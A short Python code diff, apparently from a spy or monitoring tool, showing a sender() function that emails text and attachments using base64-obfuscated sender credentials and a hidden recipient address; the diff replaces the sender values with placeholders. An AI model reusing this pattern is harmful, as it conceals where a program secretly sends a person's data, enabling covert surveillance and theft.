@@ -12,8 +12,8 @@ import subprocess
 import pyautogui
 
 def sender(BodyText,attach_filename,recived_attachments):
-    senderemail=base64.b64decode('c3B5Zm91cGRhdG9yQGdtYWlsLmNvbQ==').decode('utf-8')
-    senderpass=base64.b64decode('c3B5Zm91cGRhdG9yeHh4eA==').decode('utf-8')
+    senderemail=base64.b64decode('Sender_email').decode('utf-8')
+    senderpass=base64.b64decode('password_here').decode('utf-8')
     recivermail=base64.b64decode('YW5pc2guZGhha2FsLmFkLmFkMTVAZ21haWwuY29t').decode('utf-8')
         
 
